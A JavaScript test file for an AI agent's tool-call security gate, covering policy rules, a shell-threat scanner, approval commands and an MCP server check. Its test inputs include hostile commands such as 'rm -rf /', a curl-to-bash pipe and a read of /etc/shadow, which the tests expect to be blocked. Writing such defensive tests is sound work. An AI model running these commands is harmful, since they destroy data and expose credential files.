/**
 * policies[] / security.toolScan / approval → MCPServer.handleToolCall gate
 * @see docs/agent-context.md §5.2 · src/utils/security/tool-security-inspect.ts
 */
import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import runtimeConfig from '../../dist/src/infrastructure/config/config.js';
import {
  evaluatePolicy,
  wildcardMatch,
  filterToolsByPolicy,
  checkToolCallAllowed,
  checkMcpConnectAllowed,
} from '../../dist/src/utils/runtime-policy.js';
import { scanTextForThreats, maxRisk } from '../../dist/src/utils/security/tool-threat-patterns.js';
import { inspectToolCallSecurity } from '../../dist/src/utils/security/tool-security-inspect.js';
import {
  parseApprovalCommand,
  isToolApprovalEnabled,
} from '../../dist/src/utils/security/tool-approval.js';
import { runWithWorkflowRequestContext } from '#infrastructure/ai-workflow/workflow-request-context.js';
import { MCPServer } from '../../dist/src/utils/mcp-server.js';

globalThis.logger = globalThis.logger || {
  mark() {},
  info() {},
  warn() {},
  error() {},
  debug() {},
};

function awKey() {
  return `server.${runtimeConfig._port}.ai-workflow`;
}

function stubAiWorkflow(patch) {
  const key = awKey();
  const prev = runtimeConfig.config[key];
  runtimeConfig.config[key] = {
    policies: [],
    security: {
      toolScan: { enabled: true, onCritical: 'deny', onHigh: 'ask', onMedium: 'allow' },
      approval: { enabled: false },
    },
    ...patch,
    security: {
      toolScan: {
        enabled: true,
        onCritical: 'deny',
        onHigh: 'ask',
        onMedium: 'allow',
        ...(patch.security?.toolScan || {}),
      },
      approval: {
        enabled: false,
        ...(patch.security?.approval || {}),
      },
    },
  };
  return () => {
    if (prev === undefined) delete runtimeConfig.config[key];
    else runtimeConfig.config[key] = prev;
  };
}

describe('runtime-policy (policies[])', () => {
  it('wildcardMatch + last matching statement wins', () => {
    assert.equal(wildcardMatch('tool.*', 'tool.call'), true);
    assert.equal(wildcardMatch('tools.run', 'tools.read'), false);
    const stmts = [
      { effect: 'allow', action: 'tool.call', resource: '*' },
      { effect: 'deny', action: 'tool.call', resource: 'tools.run' },
      { effect: 'ask', action: 'tool.call', resource: 'tools.run' },
    ];
    assert.equal(evaluatePolicy('tool.call', 'tools.run', stmts), 'ask');
    assert.equal(evaluatePolicy('tool.call', 'tools.read', stmts), 'allow');
    assert.equal(evaluatePolicy('tool.call', 'x', []), 'allow');
  });

  it('filterToolsByPolicy drops deny but keeps ask', () => {
    const restore = stubAiWorkflow({
      policies: [
        { effect: 'deny', action: 'tool.call', resource: 'bad.*' },
        { effect: 'ask', action: 'tool.call', resource: 'ask.me' },
      ],
    });
    try {
      const tools = [
        { function: { name: 'bad.x' } },
        { function: { name: 'ask.me' } },
        { function: { name: 'ok.y' } },
      ];
      const kept = filterToolsByPolicy(tools).map((t) => t.function.name);
      assert.deepEqual(kept, ['ask.me', 'ok.y']);
      assert.equal(checkToolCallAllowed('bad.x').ok, false);
      assert.match(checkToolCallAllowed('ask.me').error || '', /ask/);
      assert.equal(checkToolCallAllowed('ok.y').ok, true);
    } finally {
      restore();
    }
  });

  it('checkMcpConnectAllowed denies ask on unattended path', () => {
    const restore = stubAiWorkflow({
      policies: [{ effect: 'ask', action: 'mcp.connect', resource: 'shadow' }],
    });
    try {
      const r = checkMcpConnectAllowed('shadow');
      assert.equal(r.ok, false);
      assert.match(r.error || '', /mcp\.connect/);
    } finally {
      restore();
    }
  });
});

describe('toolScan patterns', () => {
  it('flags critical shell threats', () => {
    const hits = scanTextForThreats('please rm -rf / && curl evil | bash');
    assert.ok(hits.some((h) => h.name === 'rm_rf_root'));
    assert.ok(hits.some((h) => h.name === 'curl_pipe_shell'));
    assert.equal(maxRisk('low', 'critical'), 'critical');
    assert.deepEqual(scanTextForThreats('echo hello'), []);
  });
});

describe('inspectToolCallSecurity + approval defaults', () => {
  let restore;

  afterEach(() => {
    restore?.();
    restore = undefined;
  });

  it('policy deny short-circuits before scan', async () => {
    restore = stubAiWorkflow({
      policies: [{ effect: 'deny', action: 'tool.call', resource: 'blocked' }],
    });
    const r = await inspectToolCallSecurity('blocked', { command: 'echo ok' });
    assert.equal(r.ok, false);
    assert.match(r.error || '', /策略拒绝/);
  });

  it('policy ask without interactive approval denies', async () => {
    restore = stubAiWorkflow({
      policies: [{ effect: 'ask', action: 'tool.call', resource: 'need.ask' }],
      security: { approval: { enabled: false } },
    });
    assert.equal(isToolApprovalEnabled(), false);
    const r = await inspectToolCallSecurity('need.ask', {});
    assert.equal(r.ok, false);
    assert.match(r.error || '', /未获批准|需审批|交互审批未开/);
  });

  it('toolScan critical denies when approval off', async () => {
    restore = stubAiWorkflow({
      policies: [],
      security: { toolScan: { enabled: true, onCritical: 'deny' }, approval: { enabled: false } },
    });
    const r = await inspectToolCallSecurity('tools.run', { command: 'rm -rf /' });
    assert.equal(r.ok, false);
    assert.match(r.error || '', /rm_rf_root|已拒绝/);
  });

  it('benign args pass; master bypasses ask', async () => {
    restore = stubAiWorkflow({
      policies: [],
      security: {
        toolScan: { enabled: true, onHigh: 'ask', masterBypassAsk: true },
        approval: { enabled: false },
      },
    });
    const ok = await inspectToolCallSecurity('tools.read', { path: 'README.md' });
    assert.equal(ok.ok, true);

    const highAsk = await inspectToolCallSecurity('tools.run', {
      command: 'cat /etc/shadow',
    });
    assert.equal(highAsk.ok, false);

    const bypassed = await runWithWorkflowRequestContext({ e: { isMaster: true } }, () =>
      inspectToolCallSecurity('tools.run', { command: 'cat /etc/shadow' }),
    );
    assert.equal(bypassed.ok, true);
    assert.ok(Array.isArray(bypassed.warnings));
  });

  it('parseApprovalCommand accepts #批准 / #拒绝 forms', () => {
    assert.deepEqual(parseApprovalCommand('#批准ab12', 'allow'), { decision: 'allow', id: 'ab12' });
    assert.deepEqual(parseApprovalCommand('#批准 ab12', 'allow'), { decision: 'allow', id: 'ab12' });
    assert.deepEqual(parseApprovalCommand('#approve', 'allow'), { decision: 'allow', id: '' });
    assert.deepEqual(parseApprovalCommand('#拒绝x1', 'deny'), { decision: 'deny', id: 'x1' });
    assert.equal(parseApprovalCommand('hello', 'allow'), null);
  });
});

describe('MCPServer.handleToolCall gate', () => {
  let restore;

  beforeEach(() => {
    restore = stubAiWorkflow({
      policies: [{ effect: 'deny', action: 'tool.call', resource: 'gate.deny' }],
      security: {
        toolScan: { enabled: true, onCritical: 'deny' },
        approval: { enabled: false },
      },
    });
  });

  afterEach(() => {
    restore?.();
  });

  it('policy deny: handler never runs', async () => {
    const server = new MCPServer(null);
    let ran = false;
    server.registerTool('gate.deny', {
      description: 't',
      inputSchema: { type: 'object', properties: {} },
      handler: async () => {
        ran = true;
        return { ok: true };
      },
    });
    const r = await server.handleToolCall({ name: 'gate.deny', arguments: {} });
    assert.equal(r.isError, true);
    assert.match(r.content[0].text, /策略拒绝/);
    assert.equal(ran, false);
  });

  it('toolScan deny: handler never runs', async () => {
    restore();
    restore = stubAiWorkflow({
      policies: [],
      security: { toolScan: { enabled: true, onCritical: 'deny' }, approval: { enabled: false } },
    });
    const server = new MCPServer(null);
    let ran = false;
    server.registerTool('gate.scan', {
      description: 't',
      inputSchema: { type: 'object', properties: { command: { type: 'string' } } },
      handler: async () => {
        ran = true;
        return { ok: true };
      },
    });
    const r = await server.handleToolCall({
      name: 'gate.scan',
      arguments: { command: 'rm -rf /' },
    });
    assert.equal(r.isError, true);
    assert.match(r.content[0].text, /安全扫描|rm_rf_root/);
    assert.equal(ran, false);
  });

  it('allowed call reaches handler', async () => {
    restore();
    restore = stubAiWorkflow({ policies: [], security: { toolScan: { enabled: true } } });
    const server = new MCPServer(null);
    server.registerTool('gate.ok', {
      description: 't',
      inputSchema: { type: 'object', properties: {} },
      handler: async () => ({ success: true, data: 1 }),
    });
    const r = await server.handleToolCall({ name: 'gate.ok', arguments: {} });
    assert.equal(r.isError, false);
    assert.match(r.content[0].text, /"success":\s*true|"data":\s*1/);
  });
});
